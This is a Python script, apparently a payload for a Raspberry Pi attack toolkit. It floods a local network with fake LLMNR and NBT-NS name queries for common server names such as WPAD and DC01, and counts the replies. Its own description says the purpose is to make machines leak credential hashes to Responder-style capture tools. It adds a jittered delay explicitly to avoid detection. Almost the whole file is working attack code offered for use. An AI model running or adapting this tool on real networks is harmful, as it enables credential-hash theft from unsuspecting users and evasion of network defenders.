#!/usr/bin/env python3
# @name: LLMNR/NBT-NS Query Injector
# @desc: Generate decoy LLMNR or NBT-NS name queries on a selected interface at a bounded rate while reporting sent traffic and observed responses.
# @category: network
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- LLMNR/NBT-NS Query Injector
=================================================
Author: 7h30th3r0n3

Active LLMNR and NBT-NS query injector.  Sends multicast LLMNR queries
(UDP 224.0.0.252:5355) and NBT-NS broadcast queries (UDP port 137) for
non-existent hostnames to trigger hash captures by Responder or similar
tools running on the network.

Controls:
  python3 llmnr_query_inject.py [iface] [LLMNR|NBT-NS|Both] [duration_seconds]

    iface             -- optional network interface to inject on.
    LLMNR|NBT-NS|Both -- optional protocol to inject (default: LLMNR).
    duration_seconds  -- optional time to run (default: unbounded,
                          Ctrl-C stops early).

  A background sniffer counts LLMNR/NBT-NS responses seen while
  injecting; a periodic status line and a final summary are printed.

Requires: scapy
"""

import os
import sys
import time
import struct
import random
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

try:
    from scapy.all import (
        IP, UDP, Raw, send, sniff as scapy_sniff, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LLMNR_MCAST = "224.0.0.252"
LLMNR_PORT = 5355
NBTNS_BCAST = "255.255.255.255"
NBTNS_PORT = 137

HOSTNAMES = [
    "WPAD", "ISATAP", "FILESRV", "PRINTER", "DC01", "EXCHANGE",
    "SHAREPOINT", "SQLSERVER", "MAILSRV", "INTRANET", "BACKUP",
    "FILESERVER", "WEBPROXY", "HELPDESK", "NETLOGON", "CITRIX",
    "VPNGATE", "NAS01", "SCCM", "WSUS",
]

PROTOCOLS = ["LLMNR", "NBT-NS", "Both"]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
injecting = False
protocol_idx = 0
queries_sent = 0
responses_detected = 0
status_msg = "Ready"

# ---------------------------------------------------------------------------
# Packet builders
# ---------------------------------------------------------------------------

def _build_llmnr_query(hostname):
    """Build an LLMNR query packet for a hostname."""
    txn_id = random.randint(0, 0xFFFF)
    encoded = b""
    for part in hostname.split("."):
        encoded += bytes([len(part)]) + part.encode("ascii")
    encoded += b"\x00"
    # DNS-style query: header + question
    header = struct.pack("!HHHHHH", txn_id, 0x0000, 1, 0, 0, 0)
    question = encoded + struct.pack("!HH", 1, 1)  # A record, IN class
    payload = header + question
    pkt = (
        IP(dst=LLMNR_MCAST, ttl=1)
        / UDP(sport=random.randint(49152, 65535), dport=LLMNR_PORT)
        / Raw(load=payload)
    )
    return pkt


def _encode_nbtns_name(name):
    """Encode a NetBIOS name using first-level encoding (RFC 1001)."""
    padded = name.upper().ljust(16, " ")[:16]
    encoded = b""
    for ch in padded.encode("ascii"):
        encoded += bytes([0x41 + (ch >> 4), 0x41 + (ch & 0x0F)])
    return encoded


def _build_nbtns_query(hostname):
    """Build an NBT-NS name query broadcast packet."""
    txn_id = random.randint(0, 0xFFFF)
    flags = 0x0110  # recursion desired, broadcast
    header = struct.pack("!HHHHHH", txn_id, flags, 1, 0, 0, 0)
    nb_name = _encode_nbtns_name(hostname)
    # Length-prefixed name + null terminator
    question = bytes([32]) + nb_name + b"\x00"
    question += struct.pack("!HH", 0x0020, 0x0001)  # NB type, IN class
    payload = header + question
    pkt = (
        IP(dst=NBTNS_BCAST)
        / UDP(sport=137, dport=NBTNS_PORT)
        / Raw(load=payload)
    )
    return pkt

# ---------------------------------------------------------------------------
# Injection thread
# ---------------------------------------------------------------------------

def _inject_thread():
    """Send queries in a loop until stopped."""
    global injecting, queries_sent, status_msg

    hostname_idx = 0

    while _running and injecting:
        hostname = HOSTNAMES[hostname_idx % len(HOSTNAMES)]
        proto = PROTOCOLS[protocol_idx]

        try:
            if proto in ("LLMNR", "Both"):
                pkt = _build_llmnr_query(hostname)
                send(pkt, verbose=False)
                with lock:
                    queries_sent += 1

            if proto in ("NBT-NS", "Both"):
                pkt = _build_nbtns_query(hostname)
                send(pkt, verbose=False)
                with lock:
                    queries_sent += 1

            with lock:
                status_msg = f"Sent: {hostname} ({proto})"
        except Exception as exc:
            with lock:
                status_msg = f"Err: {str(exc)[:16]}"

        hostname_idx += 1
        # Jittered delay to avoid pattern detection
        delay = random.uniform(0.5, 2.0)
        deadline = time.time() + delay
        while time.time() < deadline and _running and injecting:
            time.sleep(0.1)

    with lock:
        injecting = False
        status_msg = "Stopped"

# ---------------------------------------------------------------------------
# Response sniffer thread
# ---------------------------------------------------------------------------

def _sniffer_thread():
    """Sniff for LLMNR and NBT-NS responses."""
    global responses_detected

    def _handle(pkt):
        if not _running:
            return
        if pkt.haslayer(UDP):
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport
            # LLMNR response (src port 5355) or NBT-NS response (src port 137)
            if sport in (LLMNR_PORT, NBTNS_PORT) and dport not in (LLMNR_PORT, NBTNS_PORT):
                with lock:
                    responses_detected += 1

    try:
        scapy_sniff(
            prn=_handle,
            store=False,
            filter="udp port 5355 or udp port 137",
            stop_filter=lambda _: not _running,
        )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def _usage():
    print(f"Usage: {os.path.basename(__file__)} [iface] "
          f"[{'|'.join(PROTOCOLS)}] [duration_seconds]", flush=True)
    print("  iface             network interface (optional)", flush=True)
    print(f"  protocol          one of: {', '.join(PROTOCOLS)} "
          f"(default: {PROTOCOLS[protocol_idx]})", flush=True)
    print("  duration_seconds  optional run time; Ctrl-C stops early",
          flush=True)


def main():
    global _running, injecting, protocol_idx

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    if not SCAPY_OK:
        print("scapy not found! pip install scapy", flush=True)
        return 1

    iface_arg = None
    proto_arg = None
    duration_arg = None

    rest = list(args)
    proto_names_lower = [p.lower() for p in PROTOCOLS]
    if rest and rest[0].lower() not in proto_names_lower and not rest[0].isdigit():
        iface_arg = rest.pop(0)
    if rest and rest[0].lower() in proto_names_lower:
        proto_arg = rest.pop(0)
    if rest:
        duration_arg = rest.pop(0)

    if proto_arg:
        protocol_idx = proto_names_lower.index(proto_arg.lower())

    duration = None
    if duration_arg:
        try:
            duration = max(1, int(duration_arg))
        except ValueError:
            _usage()
            return 1

    if iface_arg:
        conf.iface = iface_arg

    print(f"[*] Protocol: {PROTOCOLS[protocol_idx]}"
          f"{'  Iface: ' + iface_arg if iface_arg else ''}", flush=True)
    print("[*] Injecting LLMNR/NBT-NS queries for decoy hostnames... "
          "(Ctrl-C to stop)", flush=True)

    threading.Thread(target=_sniffer_thread, daemon=True).start()

    injecting = True
    thread = threading.Thread(target=_inject_thread, daemon=True)
    thread.start()

    try:
        start = time.time()
        last_report = 0
        while duration is None or time.time() - start < duration:
            time.sleep(1)
            elapsed = int(time.time() - start)
            if elapsed - last_report >= 5:
                last_report = elapsed
                with lock:
                    qs = queries_sent
                    rd = responses_detected
                    msg = status_msg
                ts = datetime.now().strftime("%H:%M:%S")
                print(f"[{ts}] {msg}  queries={qs} responses={rd}", flush=True)
    except KeyboardInterrupt:
        print("\n[*] Stopping...", flush=True)
    finally:
        _running = False
        injecting = False
        thread.join(timeout=3)

    with lock:
        qs = queries_sent
        rd = responses_detected

    print(f"[*] Summary: protocol={PROTOCOLS[protocol_idx]} "
          f"queries_sent={qs} responses_detected={rd}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
